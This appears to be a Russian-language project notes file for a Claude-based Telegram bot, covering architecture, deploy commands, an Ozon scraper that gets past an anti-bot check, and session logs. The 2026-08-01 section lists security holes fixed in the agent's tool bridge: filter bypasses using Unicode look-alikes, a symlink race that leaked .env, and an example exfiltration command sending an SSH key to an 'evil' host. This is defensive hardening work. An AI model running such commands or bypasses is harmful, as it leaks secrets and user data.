# Kesha TG Bot

Telegram-бот на `ClaudeSDKClient` (persistent connection) из официального `claude-agent-sdk`.

## Архитектура (v2.1 — single-node, no failover/Redis)

```
Telegram (Aiogram 3) → handlers.py → chat_state.py (ChatState) → response_stream.py → claude_session.py → Claude CLI
```

### Модули

| Файл | Строк | Что делает |
|------|-------|-----------|
| **bot.py** | ~200 | Bootstrap: bot/dp creation, main(), singleton lock, wiring |
| **config.py** | ~200 | Env, logging, STRINGS, t(), ALLOWED_MODELS |
| **chat_state.py** | ~710 | ChatPhase state machine, PendingEntry, ChatState, ChatRegistry, preventive compact-таймер |
| **handlers.py** | ~540 | Все @dp.message handlers, set_commands() |
| **response_stream.py** | ~270 | _ask() — streaming via send+edit_message_text, ToolStatusTracker, retries |
| **telegram_io.py** | ~170 | user_prefix, _send_safe, split_msg, typing_loop, draft helpers |
| **media.py** | ~200 | download_file, transcribe (aiohttp), caches, cleanup |
| **claude_session.py** | ~300 | ClaudeSDKClient wrapper (file-only session persistence), inject, interrupt, can_use_tool |
| **tool_status.py** | ~225 | Live tool status bubble с таймерами |
| **compact.py** | ~140 | Context compaction (summarize → reset → continue) |
| **kesha_tools.py** | ~400 | MCP tools: send_media, reminders, config, search_memory, run_on_laptop |
| **reminders.py** | ~360 | SQLite reminders (plain/urgent_llm/lazy_llm) |
| **message_log.py** | ~80 | SQLite full message logging (user+assistant), on_message callback for RAG |
| **rag.py** | ~730 | RAG semantic memory: bge-m3 int8 + sqlite-vec + FTS5 + chunking. Диалоги + ФАЙЛЫ (.md/.txt heading-aware), watchfiles watcher, RO/RW executor split |

### ChatState — центр per-chat state

Каждый чат имеет свой `ChatState` с фазами:
```
IDLE → COLLECTING → PROCESSING → IDLE
                         ↓
                    COMPACTING → IDLE
          /stop → STOPPING → IDLE
```

Вся мутация per-chat state — только через ChatState API (`accept_entry`, `request_stop`, `request_clear`, `request_compact`, `set_debounce`). Никаких глобальных dict/set.

## Сессии

- Per-chat session files: `./storage/sessions/<chat_id>`
- `ChatRegistry.get(chat_id)` → lazy create ClaudeSession + ChatState
- `/clear` → `request_clear()` → reset session (rejected during PROCESSING)
- Session переживает рестарт бота (persistent file)

## Message Flow

1. TG message → `handlers.py` → `PendingEntry` → `ChatState.accept_entry()`
2. Debounce (default 3s) → batch → `_run_batch()` → `_ask()`
3. During PROCESSING: new messages → `session.inject()` or queue to deferred
4. After response: auto-compact check → drain deferred → IDLE

## Стриминг

- `SendMessageDraft` (Bot API 9.5) — нативная анимация печати
- Tool calls → отдельный `ToolStatusTracker` bubble с таймерами
- Markdown V1 escape для tool hints

## MCP Tools (kesha)

- `set_debounce`, `toggle_debug`, `get_bot_status`, `restart_bot`
- `send_photo`, `send_file`, `send_video`, `send_audio`, `send_voice`
- `create_reminder`, `list_reminders`, `cancel_reminder`, `update_reminder`
- `search_memory` — RAG семантический поиск по всей истории диалогов (bge-m3 int8 + sqlite-vec + FTS5 hybrid)
- `run_on_laptop` — SSH команды на ноуте через reverse tunnel (whitelist)
- Context compaction is automatic (95% threshold) and via /compact command — no MCP tool
- `react` — emoji reactions

## Ozon MCP (внешний, на московском сервере)

Кеша ходит на Ozon (поиск товаров/цены/отзывы) через отдельный MCP `ozon` — 6-й сервер в `.mcp.json`.

**Почему отдельный сервер:** Ozon (антибот Variti) ХАРДБЛОЧИТ французский IP Contabo (`fab_nmk` + «выключите VPN»). Поэтому Ozon MCP крутится на **российском** сервере `72.56.235.40` (Москва, Timeweb) — RU IP Ozon пускает (проходит `fab_chlg` challenge). Прокси не нужен: сервер сам и есть RU-выход.

**Архитектура:**
```
Кеша (Contabo) → .mcp.json "ozon" = bare `ssh -T ozon@72.56.235.40`
   → forced-command wrapper → node /opt/ozon-mcp-server/src/index.js (репа eduard256/ozon-mcp-server)
   → 1 long-lived headless Chromium проходит Variti, тянет composer-api JSON
```
- **Тулы:** `ozon_search` (поиск: sku/name/price/**ourPrice**/oldPrice/discount/rating/reviews/brand/url/image), `ozon_product_details` (карточка: price/**ourPrice**/priceRegular/oldPrice/available/seller/characteristics/description/images), `ozon_product_reviews` (author/score/comment/pros/cons/date/hasPhotos).
- **`ourPrice`** = оценка цены с Ozon-аккаунтом = `round(cardPrice × 0.8949)` (без логина). ПРИБЛИЖЕНИЕ (замер 5 SKU, ±0.1%), не точная цена. `price` = публичная «С банками». Точная аккаунт-цена требует логина (не делаем). Причина: аноним MCP vs залогиненный `premiumSubscribe` tier.
- **Регион = КРАСНОЯРСК** форсится через `krsk-state.json` (куки, captured 1 раз кликом карты). `browser.js` грузит storageState (абс. путь) + **fail-closed** self-check: регион ≠ Красноярск → **авто-запуск `refresh-region.sh`** (re-capture, ретрай 1 раз) → если не помогло, tool возвращает `isError`, НЕ московские цены. Куки слетают ~6д (не 365d) → превентивный `ozon-region-refresh.timer` каждые 5 дней. Ручной refresh: `node capture-region.mjs headless`.
- **RAM-защита прода** (там же seedon.ru + CryptoBot, 3GB): юзер `ozon` в `user-1002.slice` c `MemoryMax=800M, MemorySwapMax=0` (systemd drop-in). Пик реального запроса ~306MB. OOM бьёт ТОЛЬКО ozon-слайс (проверено kill-test'ом), прод не страдает. Idle-close браузера через 10 мин.
- **Zombie-cleanup:** `kill-stale.sh` (**root** systemd timer каждые 20мин) убивает ozon `index.js` чей parent sshd БЕЗ ESTABLISHED сокета (или PPID=1) + age>2h — зомби от протухших SSH. MUST root (ss под ozon видит 0 pid'ов → убил бы живые). Патчи: docs/tasks/ozon-fix/.
- **Доступ:** ключ kesha@Contabo в `/home/ozon/.ssh/authorized_keys` с forced-command (`no-pty`, без shell). `index.js` при EOF/обрыве SSH чистит Chromium (нет сирот).
- **Ограничения:** нет истории цен; отзывы обрезаются (лимит 1–30); первый вызов ~13с (антибот), дальше 0.3–1с; данные из внутреннего composer-api (может смениться).

## PROCESS RULES

- **Прод = Contabo DE** (158.220.127.161, single-node, no failover). Деплой: `ssh root@158.220.127.161 "sudo -u kesha git -C /opt/kesha-bot pull && systemctl restart kesha-bot-vps"`. Код `/opt/kesha-bot`, CWD `/opt/cog-second-brain`, юзер `kesha`
- **Прокси НЕ нужен** — Contabo во Франции, достаёт Anthropic/Telegram/Deepgram напрямую. НЕТ HTTPS_PROXY/TG_PROXY/NO_PROXY
- Xray на 443/8443 — это VPN Максима, НЕ трогать
- Smoke test: `python -c "import bot"` перед рестартом
- MCP тулы в Кеше: `mcp__kesha__*`
- **Перед коммитом в долгоживущей ветке — `git fetch && git diff --stat origin/main`, УДАЛЁННЫЕ строки прочитать глазами.** Минусы в коде, которого не писал = стоп, ветка отстала от main. Причина не только в `git add -A`: `git add <файл>` из ветки со старой базой записывает файл целиком в устаревшей версии и так же сносит чужое. Поймано трижды за одну сессию (правила деплоя, adaptive thinking, весь фикс #14 = −109 строк). Зелёные тесты НЕ ловят такой откат: код и его тесты откатываются синхронно
- **Проверка «секрета здесь нет» — по ЗНАЧЕНИЯМ из конфига, а не по именам/шаблонам.** Замер на #19: grep по именам и формам токенов дал 3 совпадения на ЧИСТОМ дереве (ложно-грязно) и 0 на реально текущем argv (ложно-чисто); сопоставление с живыми значениями из `env`-блоков `/opt/cog-second-brain/.mcp.json` разделило 8 против 0. В отчёт печатать только ИМЕНА переменных
- **Мутация «неограниченный цикл / бесконечный ретрай» — давать заглушке жёсткий потолок вызовов, который БРОСАЕТ.** Иначе мутант не краснеет, а вешает сьют по таймауту (`exit=124`), и в логе это не похоже на падение. Сторож, который вешается, — плохой сторож
- **Оценка УПАЛА при РАСШИРЕНИИ задачи = красный флаг, не победа.** Явно скормить подозрение ревьюеру («срок снизился, хотя объём вырос — что я упустил?»), а не радоваться цифре. Поймано на #16: 7–10 дней при расширении скоупа развалилось до честных 10–15
- **Перед деплоем — сверять SHA на remote** (`git ls-remote origin refs/heads/main`), а не доверять «мержено в main». Локальный merge без push для прода НЕ существует: `git pull` выкатит старый код и молча рестартнёт сервис без новой логики
- **Перед `merge_worker` — `git fetch && git log main..origin/main`.** `merge_worker` льёт в ЛОКАЛЬНЫЙ main, и воркер ответвляется от него же. 11.08.2026: локальный `main` стоял на `a7cb359`, а прод и `origin/main` были на `1389889` (#3/#4/#5 ушли в main через ветку `task-3/release-*`) → после мержа #6 деплой откатил бы всю работу по Codex-тулам. Лечится cherry-pick сквош-коммита на свежую ветку от `origin/main` + прогон полного сьюта на объединённом состоянии (563 теста), а не rebase старой ветки. Отдельная ловушка: `git log` в корне репо показывает ВЫЧЕКАУЧЕННУЮ ветку — сверять именно `main` (`git log --oneline main`)
- **Перед деплоем — проверять `git status` на проде.** Незакоммиченные патчи там реальны (напр. `thinking={"type":"adaptive"}` + `effort="high"` в `_make_options`); `git pull` их либо уронит конфликтом, либо затрёт молча. Патч, который нужен, → внести в код и запушить, а не оставлять dirty
- **codex_review из worktree воркера**: передавай АБСОЛЮТНЫЙ путь в `target` — скилл резолвит относительные пути от главного репо, не от worktree воркера. Иначе Codex читает не тот файл → ложный REJECT/APPROVE
- **Error-handler substring match**: при ветвлении по подстроке в ошибке → проверяй БОЛЕЕ СПЕЦИФИЧНЫЕ варианты ПЕРВЫМИ (session LIMIT ≠ session died). Rate-limit/quota ошибки = ждать, НИКОГДА не retry
- **HuggingFace fetch**: `env -u HTTPS_PROXY` — Anthropic-прокси 403-фильтрует HF. На Contabo прокси нет, но правило сохранено если вернётся

## VPS TROUBLESHOOTING (шпаргалка)

**Ребут бота:**
```bash
ssh root@158.220.127.161 "systemctl restart kesha-bot-vps"
```

**Логи:**
```bash
ssh root@158.220.127.161 "journalctl -u kesha-bot-vps --no-pager -n 50"
```

**Деплой (git pull + restart):**
```bash
ssh root@158.220.127.161 "sudo -u kesha git -C /opt/kesha-bot pull && systemctl restart kesha-bot-vps"
```

**401 / "Failed to authenticate" → токен протух:**
```bash
ssh root@158.220.127.161
sudo -u kesha -i
claude auth login   # БЕЗ HTTPS_PROXY — Contabo достаёт напрямую
# → открыть ссылку в браузере → авторизоваться → вставить код
exit
systemctl restart kesha-bot-vps
```

**Claude CLI на VPS (ручной запуск):**
```bash
sudo -u kesha -i
claude   # БЕЗ HTTPS_PROXY
```

**Статус сервиса:**
```bash
ssh root@158.220.127.161 "systemctl status kesha-bot-vps --no-pager | head -8"
```

## Session notes (2026-06-27)

### RAG Memory — полная хронология
- v2.3.0: MiniLM + sqlite-vec + FTS5 hybrid → качество 2.2/5
- v2.3.1: e5-large int8 (561MB) → OOM на VPS 2.9GB → mpnet тоже OOM → откат на MiniLM
- v2.3.2: e5-small int8 (Xenova/multilingual-e5-small, 118MB, ONNX) + batch_size=16 + arena-off → качество 4.3/5, RAM стабильный
- **v2.5.0 (2026-07-03): e5-small → bge-m3 int8** (`AlpEge/bge-m3-onnx-int8`, single-file model_quantized.onnx, dim 1024, SCHEMA v7). Переезд на Contabo 8GB снял RAM-ограничение. Выбор по separation margin на боевых 677 msgs: bge-m3 +0.237 vs e5-large +0.063 vs e5-small +0.055 (4x шире). bge-m3 = CLS-пулинг, БЕЗ query:/passage: префиксов (флаг MODEL_PREFIX=False).
- **Прод-замеры bge-m3 (Contabo)**: бот RSS 1248MB, latency поиска 58-78ms, 5/5 контрольных → топ-1 (включая еда/психология). backfill 685 msgs ~24 мин. messages.db цел.
- **⚠️ Модель ОБЯЗАНА быть single-file `model_quantized.onnx`** — fp32 с external `model.onnx_data` падает в ORT (`External data path escapes model directory`). Так упали нативный e5-large и bge-m3 fp32.
- **⚠️ MODEL_NAME ≠ нативному имени FastEmbed** — иначе `add_custom_model` пропускается → fp32 → краш. Ставим кастомное имя репо.
- **Root cause OOM (историческое, Timeweb 2.9GB)**: FastEmbed грузил все docs одним вызовом → onnxruntime arena раздувалась. Fix: batch_size=16 + enable_cpu_mem_arena=False (оставлены, на 8GB не критичны но не мешают)
- **VPS RAM budget (Contabo)**: 8GB total, бот с bge-m3 ~1248MB, ~6GB available, swap 0. Запас для будущего Ozon Playwright (~350MB) есть.
- Кеша сам отключал RAG на старом VPS (закомментировал import rag в bot.py) когда OOM убил VPN — потом восстановили через `git checkout -- bot.py`

### Reverse SSH Tunnel
- Ноут → VPS (tunnel@158.220.127.161) → порт 2222 на localhost (перенастроен с Timeweb при миграции #6)
- Ключи: `~/.ssh/tunnel_vps` (ноут→VPS), `/home/kesha/.ssh/tunnel_laptop` (VPS→ноут)
- systemd unit: `ssh-tunnel-vps.service` на ноуте (enabled, Restart=always)
- `run_on_laptop` MCP tool с whitelist команд (kill, pkill, sudo reboot, sudo systemctl restart orchestra)
- Безопасность: ключи НЕ в git, tunnel юзер restricted (no shell), порт 2222 только localhost

### Proxy / VPN — НЕ НУЖЕН
- Contabo (Франция) достаёт Anthropic/Telegram/Deepgram напрямую — прокси выпилен при миграции #6
- Старый Timeweb (72.56.235.40, Москва RU) — выведен из эксплуатации (kesha-bot-vps disabled), данные как rollback
- На Contabo Xray (443/8443) = VPN Максима, НЕ трогать

### Workers alive (на момент сессии 2026-07-09)
- `feat-rag-files` (opus 4.8, ctx:31%) — file RAG + оптимизация + bugfixes, idle. Единственный живой воркер, остальные убиты по запросу юзера.

## Session notes (2026-07-09)

### Что сделано в этой сессии
1. **Стриминг edit_message** (#stream-to-edit) — SendMessageDraft → edit_message_text, юзер может печатать пока бот отвечает. CHANGELOG v2.4.0.
2. **Миграция Timeweb→Contabo** (#6) — полный переезд на 158.220.127.161 (8GB RAM). Downtime 90с, ноль потерь. Прокси выпилен. CHANGELOG в v2.5.0.
3. **RAG bge-m3** (#8) — e5-small → bge-m3 int8 (AlpEge/bge-m3-onnx-int8), separation margin 4x. Качество 5/5, RSS 1248MB. SCHEMA v6→v7.
4. **Ozon MCP** (#7) — Ozon на московском сервере 72.56.235.40 (SSH-stdio), регион Красноярск (fail-closed), RAM-cap 800MB (user-slice), orphan cleanup. 6-й MCP сервер.
5. **ourPrice** (#9) — коэффициент 0.8949 для Ozon-Аккаунт цены без логина. Research: аноним vs залогиненный = premiumSubscribe tier.
6. **File RAG** (#10) — индексация .md/.txt из cog-second-brain (1298 файлов, 3071 чанков). Heading-aware чанкинг, watchfiles inotify, sha256 дедуп, source attribution [file: path]. SCHEMA v7→v8. RO/RW executor split (search 37ms во время backfill). Session limit retry loop fix.
7. **Убили лишних воркеров** — 6 из 7 idle воркеров убиты (feat-ozon-mcp, feat-rag-upgrade, feat-migrate-contabo, stream-to-edit, rag-research, kesha-p0-fix, code-review). Остался только feat-rag-files.

### Важные решения
- **ourPrice коэффициент 0.8949** (не 0.893) — пересчитан по 5 SKU, попадание ±18₽ на 55К
- **Файлы не ищутся баг**: `if role: f_vec,f_fts=[],[]` в rag.py выкидывал файлы при role="user". Fix: файлы ВСЕГДА ищутся, role фильтрует только диалоги
- **Session limit retry loop**: «session limit» содержит «session» → попадал в reconnect-ветку. Fix: специфичный детектор _session_limit_reset() ПЕРЕД общим «session» check
- **Cherry-pick при мерже параллельных веток**: ветка Ozon содержала старый rag.py (e5-small) — наивный merge откатил бы bge-m3. Cherry-pick только Ozon-изменений на fresh branch от main. Это было ТРИЖДЫ за сессию (docs, ourPrice, coeff fix)
- **CLAUDE.md теперь актуален для Contabo** (не Timeweb) — PROCESS RULES, VPS TROUBLESHOOTING, tunnel IP обновлены

### Файлы для контекста
- `docs/tasks/6/` — миграция research/plan/report
- `docs/tasks/7/` — Ozon MCP research/plan/report + deployed patches
- `docs/tasks/8/` — RAG bge-m3 research/plan/report
- `docs/tasks/9/` — ourPrice research + deployed patches
- `docs/tasks/10/` — file RAG research/plan/report + codex reviews + prod-bugs
- `artifacts/rag-files-report.html` — интерактивный HTML-отчёт по file RAG (40KB)

### Открытые вопросы
- Юзер упоминал **MMO-файл** (`04-projects/mmo-economy-game.md`) и **Google Cloud Zahoron** — ни то ни другое не реализовано, задачи не созданы. Если спросит — уточнить что именно нужно.
- **Ozon фильтры** (бренд/тип/etc) — достижимы (research #9 подтвердил, фасеты есть в raw JSON), но не имплементированы. Таск не создан.
- **CLAUDE.md частично устарел** — секция «Стриминг» всё ещё упоминает SendMessageDraft (строка 58), хотя стриминг уже через edit_message_text. Мелочь, но заметно.

## Session notes (2026-07-18) — File RAG, preventive compact, Ozon fixes

### Что сделано (v2.6.0)
1. **File RAG (#10)** — индексация `.md`/`.txt` из cog-second-brain (1318 файлов, 3498 чанков) в тот же
   RAG что диалоги. Heading-aware чанкинг, watchfiles watcher, sha256 дедуп, source attribution. SCHEMA 7→8,
   отдельные файловые таблицы. RO/RW executor split (search не ждёт backfill: 37ms vs 300000ms). docs/tasks/10/.
2. **Preventive compact-таймер** — chat_state.py: idle 55мин + ctx>20% → compact пока кеш тёплый (перед
   неизбежным cold-start). Экономит ~18% burn лимитов (cold-start доля 30%→12%). docs/tasks/cache-compact/.
3. **Session-limit fix** — «hit your session limit» не ретраить (был loop 2-3× reconnect). response_stream.py.
4. **File-search role bug** — role="user" выкидывал ВСЕ файлы. Fix: файлы ищутся всегда, role → только диалоги.
5. **Ozon fixes** (москва) — kill-stale.sh (root timer, зомби node по socket-state) + region auto-refresh
   (browser.js → refresh-region.sh при провале self-check + weekly timer). docs/tasks/ozon-fix/.
6. **ourPrice 0.893→0.8949** (5 SKU).

### Ключевые решения (замерено, не догадки)
- **Compact-таймер T=55мин фикс, не адаптивный:** false-rate падает монотонно (50→15.9%, 55→7.5%, 59→0.9%);
  55 = 7.5% ложных + 5мин запаса до TTL. Адаптив по часу экономил бы ~$0.78/мес (шум).
- **ctx-гейт 20%:** compact сжимает до ~4% (замер, не 1%) → breakeven 19.4%. Ниже — убыток.
- **kill-stale MUST root:** `ss` под юзером ozon видит 0 pid'ов → снёс бы живые сессии (поймал в тесте).
  Зомби = parent sshd без ESTABLISHED сокета, НЕ по возрасту (MCP-сессия долгоживущая).
- **Cold-start эмпирика:** TTL ровно 60мин, P(gap>60|gap>55)=92.5% → cold-start почти неизбежен при простое.

### Process rule (усвоено)
- **Не выдумывать кривые для допущений.** Первый timing-sweep использовал выдуманную «рампу остывания
  кеша с 30мин» — первоисточник (docs/tasks/cache-optimization) опровергает: TTL=60, плоско до 30мин.
  Оркестратор поймал. Число из замера, НЕ «правдоподобная» интерполяция.

### Открытые вопросы
- **v2.6.0 задеплоено** на Contabo (2026-07-18). watchfiles установлен, бот рестартнут, preventive compact активен.

## Session notes (2026-07-31) — клиент Александр: баны Claude + феасибилити Codex

### #15 — гайд «от почты до оплаты» (docs/tasks/15/guide-alexander.md)
Клиент словил 5 банов подряд. **Первичная причина — НЕ датацентровый IP** (это была рабочая гипотеза, опровергнута):
РФ отсутствует в [Supported Regions](https://www.anthropic.com/supported-countries), ToS привязывает доступ к этой
политике → VPN маскирует локацию, но не делает использование легитимным. Гарантий не существует в принципе.
DC-IP = усилитель, не приговор: наш Кеша месяцами живёт на Contabo (DC, Франция). Убивает **стек** сигналов:
неподдерживаемый регион + прыгающий VPN + покупная почта + платёж через минуты после регистрации + сразу бот.

- **Agent SDK на подписке ЛЕГИТИМЕН, доплачивать не надо.** Анонс «с 15.06.2026 отдельный пул кредитов»
  [отменён в день вступления в силу](https://support.claude.com/en/articles/15036540-use-the-claude-agent-sdk-with-your-claude-plan):
  «For now, nothing has changed: Claude Agent SDK, `claude -p` ... still draw from your subscription's usage limits».
  Первый поиск уверенно выдал противоположное — спасло открытие первоисточника.
- **Тариф:** `config.py:18` = Opus по умолчанию + AUTO_COMPACT_PCT=95 + превентивный компакт 55мин + `urgent_llm`
  будит модель без юзера → лимит горит в тишине. Pro реалистичен только на Sonnet, база для Opus — Max 5x.
- Codex-ревью НЕ проводилось (квота до 2026-08-05). Документ cross-LLM не проверялся.

### #16 — Кеша на Codex/GPT (docs/tasks/16/research.md)
**Технически РЕАЛЬНО: 9–14 чел-дней паритет / 4–6 дней «лайт».** Ранее клиенту сказали «у Кеши нет возможности
работать через харнес Codex» — на сегодня это неверно, харнес есть.
- Проверено живьём: `codex app-server --stdio` = JSON-RPC, **88 методов** (spikes/appserver_methods.txt).
  Прямые аналоги всех сложных фич: `turn/steer`+`thread/inject_items` (inject), `turn/interrupt` (/stop),
  `thread/compact/start`, `thread/resume`, `account/rateLimits/read`. Генерация НЕ проверена — квота 100%.
- **Единственный архитектурный разрыв:** `create_sdk_mcp_server` (kesha_tools.py:512) — 16 тулов внутри процесса
  бота, дёргают `bot` напрямую. У Codex MCP только внешний stdio → выносить в процесс + мост. 3–4 дня, самый риск.
- Связано с SDK 3 файла из 14. Не трогаются: rag/reminders/media/message_log/telegram_io/tool_status/handlers (~55%).
- **Рекомендация — форк-ветка (вариант B), НЕ общий слой:** общий слой требует обобщить compact-транзакцию
  (claude_session.py:127-198) = трогать рабочего Claude-Кешу.
- **БЛОКЕР ЮРИДИЧЕСКИЙ:** OpenAI ToS, «What you cannot do»: «Automatically or programmatically extract data or
  Output». TG-бот 24/7 = ровно это. В родственных редакциях есть carve-out «except as permitted through the API» —
  то есть API разрешён явно, подписка нет. Мейнтейнер openai/codex: «I'm an engineer, not a lawyer».
  → Решение принимает клиент письменно ДО работ. Вариант C (OpenAI API) риска не несёт, но платится сверх подписки.

### Открытое
- Александру нужна реальная ссылка на репозиторий — в гайде плейсхолдер.
- Гейт по #16: B (подписка, ToS-риск) или C (API) — ждёт решения клиента, воркер STOP на гейте, НЕ убивать.
- Прежде чем тратить 2 недели на GPT — выяснить, за что банят Claude-аккаунт клиента. Если причина в регионе/оплате,
  а не в Claude, GPT забанит так же.

### #14 — компакт только ночью + context reserve (смержено, НЕ задеплоено)
`1aba008` в main. 167 тестов зелёные (проверено независимо на итоговом состоянии). T4 (деплой на Contabo) НЕ выполнялся.
- Нативный auto-compact выключен (`claude_session.py:253`); `run_native_manual_compact`/`maybe_auto_compact` удалены — один владелец компакта.
- Fail-closed резерв 208K+prompt: не хватает места → сообщение НЕ уходит в Claude, контекст не растёт, Кеша один раз просит `/compact`.
- Ночное окно 23:00–08:00 Красноярск (проверено по всем 24 часам), аддитивная миграция `chat_activity`.
- Латч резерва снимается и `/clear`, и успешным компактом → не залипает.

**Окружение (грабли, стоили воркеру хода):** тесты требуют `claude-agent-sdk 0.2.128` (как на проде); на 0.1.50 падают 12 тестов с `TypeError: ResultMessage.__init__() got an unexpected keyword argument 'api_error_status'` — тесты правы, venv был протухший. `~/.config/uv/uv.toml` держит `exclude-newer = "7 days"`, из-за чего 0.2.128 не резолвится («no version of claude-agent-sdk==0.2.128») → ставить с `--exclude-newer 2030-01-01`. Локальный `.venv` приведён к 0.2.128 + pytest + RAG-деды.
**Локальный смоук `import bot` падает** на `aiohttp_socks` — это артефакт HTTPS_PROXY из локального `.env` (`bot.py:41` читает его), на проде прокси нет. С пустым прокси импорт проходит.

### #17 — баг: стриминг замирает (заведён, не чинён)
Юзер: пишешь боту во время стрима → правки замирают, потом дописывает всё разом. **Причина — флуд-контроль Telegram на edit, НЕ регрессия #14.** `response_stream.py:25` interval 1.0s, `:126-131` ставит `edit_flood_until`, `:111-112` молча выходит пока дедлайн не прошёл. Генерация не блокируется — замирает только отображение. Гипотеза про `session.inject` **опровергнута**: inject не вызывается ни из одного ingress-пути (#14 заменил инжект чистой отложенной очередью, `chat_state.py:149-160`).

### Хвосты
- Codex-квота исчерпана до 2026-08-05 06:15 UTC → ревью #14/#15/#16 НЕ проводилось, вердиктов Codex нет. Пустое падение воркера без слова про лимит = квота, не инфраструктура; работу забирать через `worker_wip` + коммитить руками.
- `/clear` чистит `_context_reserve_blocked` вне `_lock`, два других места — под локом. Безобидно, но несогласованно (`chat_state.py:283`).

## Session notes (2026-08-01) — прод-инцидент + #16 два рантайма

### Прод-инцидент: Кеша замолчал (ПОЧИНЕНО, задеплоено `ad81cd5`)
Симптом: на каждое сообщение «⚠️ Не удалось проверить свободный контекст». Деплой #14 → откат → фикс → редеплой.
**Root cause не тот, что казался.** Модель и `[1m]` были верны (замер на проде: `maxTokens=1000000`).
Реальная причина: Result лимита плана приходит с `is_error=False` и ПУСТЫМ `model_usage` → `.get(expected)` вернул
None → `_max_output_tokens_valid` залатчился False НАВСЕГДА → все сообщения умирали в МОЛЧАЛИВОЙ ветке
`runtime_invariant` (поэтому лога не было). Событие квоты классифицировано как вечная поломка рантайма.
- Фикс: пустое usage не латчит; латч снимается хорошим payload; лимит/контекст-лимит короткие замыкания не трогают
  инвариант; юзеру называется настоящая причина; `EXPECTED_CONTEXT_MODEL` выводится из `config.MODEL`.
- **167 зелёных тестов при мёртвом проде** — фикстуры гоняли `claude-sonnet-4-6`, а не боевую `config.MODEL`.
  Теперь `make_session` строит сессии из конфига. Тесты mutation-проверены (вернуть баг → краснеют).

### #16 — два рантайма Claude↔Codex (В РАБОТЕ, вариант А на подписке)
Решение юзера 2026-08-01: делаем на подписке, ToS-риск принят владельцем, вопрос закрыт.
Цель: аварийное переключение командой из бота. Образец — Orchestra (`app/backend_protocol.py` 16 строк на 1283
строки адаптера, `session.py:1519 change_model`, `_build_runtime_handoff:1480` — хендофф подаётся как user-текст).
Оценка 10–15 дней. Сделано T1–T3 (+TTL), дальше T4 (Codex-адаптер) → T5 (переключение) → T8 (авто-failover).
- **T1** `runtime_protocol.py` — `ChatRuntime` Protocol + `RuntimeCapabilities`. Compact в протокол НЕ входит.
- **T2** `runtime_registry.py` — fail-loud при сборке (нет метода / не соответствует / capabilities врут).
- **T3** `tool_bridge.py` — unix socket + capability-token, 15 тулов за мостом. `run_on_laptop` исключён НАВСЕГДА.
- Компакт на Codex — **родной** (`thread/compact/start`), не наш: наша транзакция требует владеть сессиями,
  жжёт квоту на summary и проверяет текст на мусор (`_GARBAGE_PATTERNS`) — от Codex текста не получаем.

### Дыры, найденные в T3 (все закрыты, все проверены атакой независимо от воркера)
1. **Обход фильтра `chat_id`** пятью написаниями: ` chat_id`, `chat_id `, `chat-id`, кириллическая `с`, ZWSP.
   Фикс: whitelist аргументов из `input_schema` тула + `normalize_arg_name` (отказ на не-ASCII ДО нормализации).
2. **Межчатовая утечка** (2 юзера: Максим + Катя): процессная глобаль `_active_chat_id` перезаписывалась →
   ответ мог уйти не тому. Фикс: адресация через сессию моста (`X-Kesha-Bridge-Session`) + `copy_context()` на вызов.
   На проде дыры не было — глобаль жила только в ветке.
3. **4 близнеца `send_file`** (`send_photo/video/audio/voice`) были за мостом с произвольным путём. Фикс: gate на всех
   пяти + структурный тест, читающий исходник каждого тула с `path`.
4. **TOCTOU** (нашёл Codex): `FSInputFile` запоминает путь, читает позже → подмена на симлинк ПОСЛЕ проверки
   отдавала `.env`. Фикс: `open_sendable()` читает в момент проверки (`O_NOFOLLOW`), тулы на `BufferedInputFile`.
   **Урок методики: проверять конечное действие (что ушло в Telegram), а не промежуточную функцию.**
5. **Hardlink обходил whitelist**: у жёсткой ссылки нет «цели», путь резолвится сам в себя. Фикс: при `st_nlink>1`
   требуется, чтобы все имена лежали внутри корней.
6. **Эксфильтрация с ноута легальными командами**: `curl -T ~/.ssh/id_rsa https://evil/` — без метасимволов.
   Также `ip route flush`, `kill -9 -1`, `find -fprint`. Whitelist ужесточён (тул доступен Claude-Кеше СЕЙЧАС).

### Codex-ревью по T3 не завершено
Два падения подряд: Codex игнорирует «ревьюй только дифф» и уходит грепать репозиторий → таймаут 10 мин.
Правило «3 падения = стоп» применено, третью попытку на том же артефакте не делаем. Вернуться в конце T4,
когда будет естественный артефакт (`codex_session.py` отдельным файлом) для `mode="exec"`.

### Грабли этой сессии
- **Ветки воркера ТРИЖДЫ несли откат чужой работы** (правила деплоя, adaptive thinking, весь фикс #14 = −109 строк).
  Причина не `git add -A`, а устаревшая база ветки. Отсюда мерж по явному списку файлов — но я так **потерял
  `ensure_roots()` в bot.py**, забыв его в списке. Вывод: после мержа сверять `git diff origin/main` с обеих сторон.
- **`.serena/project.yml`** — артефакт тулинга, постоянно лезет в диффы, в мерж не брать.

## Session notes (2026-08-02/03) — #16 два рантайма выкачены, #20/#21 фиксы, README/CHANGELOG

### Состояние прода на 03.08
`0ea696b` на Contabo (158.220.127.161), `RUNTIME=claude`, модель `claude-opus-5`. Бэкапы БД перед
каждым деплоем в `/opt/kesha-bot/storage/backup-pre*`. Деплой всегда мой (оркестратора), НЕ воркера.

### Закрыто и задеплоено
- **#16** — два рантайма Claude↔Codex, `/runtime` (текущий + модель + остаток квоты с датой сброса),
  `/runtime codex|claude`. Дефолт claude, автопереключения НЕТ (T8 не делался), боевого пробега нет.
  Файлы: `runtime_protocol.py`, `runtime_registry.py`, `tool_bridge.py`, `codex_session.py`,
  `file_access.py`. Env: `KESHA_RUNTIME`, `KESHA_CODEX_MODEL/BIN/HOME`, `KESHA_SENDABLE_ROOTS`.
  Справка по деплою: `docs/tasks/16/deploy-notes.md`.
- **#17** — стриминг не замирает при флуд-контроле TG (общий edit-бюджет на чат, 3.1с).
- **#20** — таймаут контрол-запроса 60с→10с + ретрай + `runtime_unhealthy` + лечение клиента.
  Течь `pending_control_responses` закрыта через `shield` (внешний cancel убивал уборку SDK).
- **#21** — промпт сжатия: обе полярности свидетельств, выход на ноль для записи файлов,
  дословный хвост гарантируется КОДОМ (`append_verbatim_tail`), а не просьбой.
- **#23** — README (врал про `/model`, `sendMessageDraft`, дефолт модели) + CHANGELOG v2.7.0.

### Открыто
- **#18** субагенты в чате — технически нельзя: до `response_stream` доходит обезличенный текст.
- **#19** оборванный ответ висит при лимите на пути напоминалок (предсуществующий, не регрессия).
- **#22** слияние разделов промпта 10→7 — ЖДЁТ ДАННЫХ: новый промпт отработал в проде 1 раз.
  Крон-напоминание по понедельникам считает саммари с `## OBJECTIVE`.
- Ссылка на репозиторий для README/Александра — плейсхолдер, юзер не дал.
- Codex-квота выжжена до 08.08 12:53 нашими же живыми прогонами. Ревью T3/T4 не проводилось.

### Методика, которая работала всю сессию (главное)
